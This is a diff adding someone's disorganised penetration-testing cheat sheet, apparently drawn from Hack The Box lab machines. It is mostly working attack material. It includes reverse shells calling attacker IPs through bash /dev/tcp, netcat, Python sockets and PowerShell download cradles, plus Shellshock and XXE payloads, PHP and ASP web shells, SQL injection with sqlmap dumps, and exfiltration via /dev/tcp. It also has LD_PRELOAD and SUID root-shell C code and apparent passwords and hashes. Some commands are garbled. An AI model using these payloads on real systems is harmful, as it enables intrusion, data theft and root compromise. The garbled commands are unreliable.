@@ -1,0 +1,411 @@
+﻿Methodology:
+sudo apache2 -f etc/shadow
+echo “bash -i >& /dev/tcp/10.0.0.1/8080 0>&1” >> /usr/local/bin/overwrite.sh
+
+1- Nmap -sC -sV -T4 -A -O -oA BOX p 10.10.10.10
+2- Service enumeration
+3- Nmap p 124,123 –script vuln 10.10.10.10
+4- ls -lah usr/share/nmap/scripts |gep ftp
+5- ls -lah usr/share/nmap/scripts/ftp*
+6- cmo or cold-fusion or user,admin,robots.txt
+7- Source code
+9- Dirbuster or gobuster
+10-burpsuite
+11-windows or linux
+12-searchsploit
+13-information give can be used for: 1- post expo  
+                                     2- priv esca
+                                     3- transfer  
+                                     4- Other
+14-hydra will fail use cewl 
+15-dirbuster will fail use wfuzz
+16-smbmap will give false false negative conduct manually
+17-criteria for selecting exploit: 1-download
+                                   2-upload
+                                   3-RCE OR COMMAND INJECTION
+                                   4-LFI
+                                   5-RFI
+                                   5-SQL
+18-EXPLOIT :1- EXPLOITS REQUIREMENT
+            2- UNDERSTAND PARAMETER
+19-SOLIDSTATE :1- DIRBUSTER OUTPUT
+               2- Rabbit hole
+20-after gaining shell : step1: Choose
+                         step2: current directory or sudo -l
+21-python http 2.3 exploit
+22-exploitdb/exploitbins
+23-shellshock remote code execution vulnerability
+24-friendzone – look here and there on web server
+25-h2 transfer exploit on target machine and run
+26-Brainfuck – 1- try each exploit 
+               2- Go to first directory
+               3-when ssh is private change into john format and gain password
+                ssh2john.py id_rsa > root_key
+                john root_key -w=/usr/share/wordlists/rockyou.txt
+27-Arctic : 1- C:\ColdFusion8\wwwroot\CFIDE\shell.jsp
+            2- msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw > shell.jsp
+
+--------------------------------------------------------------------------------
+Location of files stored C:\ColdFusion8\wwwroot\CFIDE\shell.jsp
+--------------------------------------------------------------------------------
+aspx using .config file
+
+<?xml version="1.0" encoding="UTF-8"?>
+<configuration>
+   <system.webServer>
+      <handlers accessPolicy="Read, Script, Write">
+         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
+      </handlers>
+      <security>
+         <requestFiltering>
+            <fileExtensions>
+               <remove fileExtension=".config" />
+            </fileExtensions>
+            <hiddenSegments>
+               <remove segment="web.config" />
+            </hiddenSegments>
+         </requestFiltering>
+      </security>
+   </system.webServer>
+</configuration>
+<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
+<%
+Response.write("-"&"->")
+' it is running the ASP code if you can see 3 by opening the web.config file!
+Response.write(1+2)
+Response.write("<!-"&"-")
+%>
+-->
+
+--------------------------------------------------------------------------------
+
+
+powershell:
+Set s = CreateObject("WScript.Shell")
+Set cmd = s.Exec("cmd /c powershell -c IEX (New-Object Net.Webclient).downloadstring('http://10.10.14.2:80/ex.ps1')")
+o = cmd.StdOut.Readall()
+Response.write(o)
+--------------------------------------------------------------------------------
+<?php echo system($_REQUEST['cmd']);?>
+
+keepass2john CEH.kdbx > john.hash
+
+powershell -c iex(new-object net.webclient).downloadstring('http://10.10.14.4:80/nc.exe')
+
+PHP WRAPPER METHODS:
+1-http://[path-to-remote-file]
+2-expect://[command]
+3-php://input&cmd=[command]  <?php echo shell_exec($GET['cmd']); ?>
+4-php://filter/convert.base64-encode/resource=[file-name]
+
+www.whitehatsec.com for hashed password
+
+nslookpup
+server 10.10.10.123
+10.10.10.123
+host -l friendzone.red 10.10.10.123
+
+python sshng2john.py ~/Desktop/htb/brainfuck/id_rsa>~/Desktop/htb/brainfuck/ssh-
+key
+
+certutil.exe -urlcache -split -f http://10.10.14.6.bastard.exe  c:\temp\bastard.exe
+
+ssh -oKexAlgorithms=diffie-hellman-group1-sha1 -p 22022 sunny@10.10.10.76
+
+irc:
+nmap -p 8067 --script=irc-unrealircd-backdoor --script-args=irc-unrealircd-backdoor.command="nc -e /bin/bash 10.10.14.6 4444"  10.10.10.117
+
+
+shellock directory: cgi-sys cgi-mod cgi-bin
+
+Shellshock vulnerability in user agent:
+() { ignored;};/bin/bash -i >& /dev/tcp/10.10.14.6/4444/port 0>&1
+() { :;}; bash -i >& /dev/tcp/10.10.14.12/4444 0>&1
+
+
+for i in $(seq 0 12); do echo -n " |base64 -d" ; done
+
+wpscan --url https://brainfuck.htb --disable-tls-checks --api-token <redacted>
+wpscan --url https://brainfuck.htb --disable-tls-checks --enumerate u
+
+http://dann.com.br/alexctf2k17-crypto150-what_is_this_encryption/
+https://crypto.stackexchange.com/questions/19444/rsa-given-q-p-and-e/19530#19530
+
+sudo -u onuma /bin/tar -cf /dev/null /dev/null --checkpoint=1 –checkpoint-action=exec=/bin/sh
+
+droopescan scan drupal -u http://10.10.10.9
+-------------------------------------------------------------------------------------------
+<?xml version="1.0"?>
+  <!DOCTYPE foo [
+   <!ELEMENT foo ANY >
+   <!ENTITY xxe SYSTEM "file:///etc/passwd" >
+  ]>
+  <feed>
+    <Author>raj</Author>
+    <Subject>chandel</Subject>
+    <Content>&xxe;</Content>
+  </feed>
+--------------------------------------------------------------------------------------------
+port 80
+1-cold fusion 
+2-user,admin,help,robots.txt
+3-cms
+4-source code
+5-certificate
+6-dirbuster 
+7-burp
+8-windows/linux
+9-searchsploit
+10-whatever information you have it will be used at any point either priviledge escalation & post-explotation
+11-when hydra fail try to use cewl
+12-when dirbuster fail use wfuzz 
+13-smbmap and smbclient will have false positive and negative try to inspect manually
+14-netcat
+15-metasploit
+16-application
+17-services 
+18-file transfer
+19-ssh key permission 600
+
+20-wfuzz -c -d "username=FUZZ&password=n00bsec" -w /usr/share/seclists/Usernames/Names/names.txt -u http://10.10.10.73/login.php
+
+21-'OR'1'='1
+
+22-sqlmap -u http://10.10.10.73/login.php --forms --level 5 --risk 3 --string "Wrong identification" --dbs --batch
+
+23-sqlmap -u http://10.10.10.73/login.php --forms --level 5 --risk 3 --string "Wrong identification"  -D falafel --tables --batch
+
+24-sqlmap -u http://10.10.10.73/login.php --forms --level 5 --risk 3 --string "Wrong identification" -D falafel -T users --dump --batch
+
+25-cat backup.7z > /dev/tcp/10.10.14.4/9001
+
+26-ldapsearch -x -h lightweight.htb -b "dc=lightweight,dc=htb"
+
+27-nc can be used to get wget version and can be exploited
+
+28-Magic byte==== GIF8;
+
+29-wc -l ---to count lines
+
+30-wc -c ---to count character
+
+31-git log and git show
+
+32-getcap -r usr/bin ; getcap -r usr/sbin ; ep – means we can read and write anything 
+
+33-tcpdump -i any -w captured.pcap
+
+34-scp 10.10.xx.xx@lightweight.htb:/home/10.10.xx.xx/captured.pcap ./
+
+35-backup.7z = 7za e backup.7z
+
+36-vsftpd 2.3.4 psy shell using nc 10.10.10.131 6200
+--------------------------------------------------------------------------------
+Certificates dealing:
+first verify that both certificates are same
+1-openssl pkey -in ca.key -pubout
+2-openssl  x509 -in ca.crt -pubkey -noout
+Create client key:
+openssl genrsa -out client.key 4096
+Create certificate sign request:
+openssl req -new -key client.key -out client.csr 
+Signing the certificate:
+1-openssl x509 -req -in client.csr -CA ca.crt -CAkey ca.key -set_serial 9001 -extensions client -days 9002 -outform PEM -out client.cer 
+2-openssl pkcs12 -export -inkey client.key -in client.cer -out client.p12
+3-import two things .p12 (your certificate)  and ca.crt files (authorities) 
+----------------------------------------------------------------------------
+[program:memcached]
+command = bash -c 'bash -i >& /dev/tcp/10.10.14.12/1234 0>&1'
+----------------------------------------------------------------------------
+cat backup.7z |base64
+ 
+python psexec.py 'pentest:P3nT3st!@10.10.10.152'
+python psexec.py -hashe ‘gasjxsxssjsddjd’ administrator@10.10.10.152
+base64 -d backup > backup.7z [lostmypass.com]
+
+echo “<html><body>HELLO</body></html>” > test.html
+
+whenever see HTTP PUT AND MOVE METHOD TRY davtest –url https://10.10.10.5
+From Put method to MOVE method:
+msfvenom -p windows/shell_reverse_tcp LHOST LPORT -f aspx > shell.aspx
+mv shell.aspx shell.txt
+curl -X PUT http://10.10.10.15/shell.txt –-data-binary @shell.txt
+curl -X MOVE –header ‘Destination:http://10.10.10.15/shell.aspx’ ‘http://10.10.10.15/shell.txt’
+
+
+Microsoft IIS 6.0 -expoit 2017-7269         
+if it is encoded 13 times:
+1-for i in $(seq 0 12); do echo -n “|base64 -d “; done
+2- base64 -d passwd.txt |base64 -d |base64 -d |base64 -d |base64 -d
+nmap -p 3632 10.10.10.3 --script distcc-cve2004-2687 --script-args="distcc-cve2004-2687.cmd='nc -nv 10.10.14.6 4444 -e /bin/bash'"
+-------------------------
+#!/bin/sh
+bash
+-------------------------
+python sshng2john.py id_rsa > ssh_login
+
+220 solidstate SMTP Server (JAMES SMTP Server 2.3.2) ready Mon, 30 Dec 2019 17:10:56 -0500 (EST)
+EHLO bla.bla
+250-solidstate Hello bla.bla (10.10.14.12 [10.10.14.12])
+250-PIPELINING
+250 ENHANCEDSTATUSCODES
+MAIL FROM: <'random@random.com>
+250 2.1.0 Sender <'random@random.com> OK
+RCPT TO: <../../../../../../../../etc/bash_completion.d>
+250 2.1.5 Recipient <../../../../../../../../etc/bash_completion.d@localhost> OK
+DATA
+354 Ok Send data ending with <CRLF>.<CRLF>
+FROM: bla.bla
+'
+/bin/nc -e /bin/bash 10.10.14.12 1234
+.
+250 2.6.0 Message received
+quit
+
+P@55W0rd1!2@
+
+heartbleedbelievethehype
+
+----------------------------------------------------------------------
+8bc8251332abe1d7f105d3e53ad39ac2
+
+-----------------------------------------------------------------------
+backup.7z
+7za e backup.7z
+base64 backup.7z
+copy it as backup.7z.enc
+base64 -d backup.7z.enc > backup.7z
+7z e backup.7z
+brute force using https://github.com/Seyptoo/7z-BruteForce.git
+
+./openssl enc -base64 -in /root/root.txt -out ./root.txt.b64
+base64 -d root.txt.b64
+------------------------------------------------------------------------
+db
+
+show collections
+
+db.table.find()
+
+db.tasks.insert({cmd: "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.12\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"})
+------------------------------------------------------------------------
+
+
+
+
+
+
+
+Linux Priv esc:
+-------------------------------------------------------------------------------
+LD_PRELOAD
+
+
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+        unsetenv("LD_PRELOAD");
+        setresuid(0,0,0);
+        system("/bin/bash -p");
+}
+
+
+
+gcc -fpic -shared -nostartfiles -o tmp/preload.so /home/user/tools/sudo/preload.c
+
+sudo LD_PRELOAD=/tmp/preload.so iftop
+id
+--------------------------------------------------------------------------
+LD_LIBRARY_PATH
+
+ldd /usr/sbin/apache2
+
+#include <stdio.h>
+#include <stdlib.h>
+
+static void hijack() __attribute__((constructor));
+
+void hijack() {
+        unsetenv("LD_LIBRARY_PATH");
+        setresuid(0,0,0);
+        system("/bin/bash -p");
+}
+
+
+
+gcc -fpic -shared -o /tmp/libcrypt.so.1 /home/user/tools/sudo/library_path.c
+sudo LD_LIBRARY_PATH=/tmp iftop
+
+------------------------------------------------------------------------------
+find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+-------------------------------------------------------------------------------
+suid-sgid object injection:
+
+strace /usr/local/bin/suid-so  2>&1 | grep -iE "open|access|no such file"
+
+#include <stdio.h>
+#include <stdlib.h>
+
+static void inject() __attribute__((constructor));
+
+void inject() {
+        setuid(0);
+        system("/bin/bash -p");
+}
+
+
+gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
+
+/usr/local/bin/suid-so
+----------------------------------------------------------------------------
+suid-sgid environment variables:
+
+int main() {
+        setuid(0);
+        system("/bin/bash -p");
+}
+
+gcc -o service /home/user/tools/suid/service.c
+
+PATH=.:$PATH /usr/local/bin/suid-env
+
+--------------------------------------------------------------------------
+suid-sgid abusing shell feature part-1
+
+bin/bash –version (<4.2-048)
+
+function /usr/sbin/service { /bin/bash -p; }
+
+export -f /usr/sbin/service
+
+/usr/local/bin/suid-env2
+
+---------------------------------------------------------------------------
+suid-sgid abusing shell feature part-2
+
+This will not work on Bash versions 4.4 and above.
+
+In tmp directory:
+
+env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
+
+tmp/rootbash -p 
+-------------------------------------------------------------------------------
+Password and keys : cat ~/.history |grep pass
+Password and keys : ls -lah
+                    strings mv.ovpn
+                     cat pass/password.txt
+Password and keys : cat .ssh/root_key
+-------------------------------------------------------------------------------
+NFS:
+
+cat etc/exports  :  no_root_squash
+mount -o rw,vers=2 10.10.148.67:/tmp /tmp/nfs
+msfvenom -p windows/shell_reverse_tcp LHOST=10.9.14.98 LPORT=4444 -f exe > shell.exe
+chmod +xs shell.exe
+transfer it in tmp directory and execute tmp/shell.exe
+
+
+
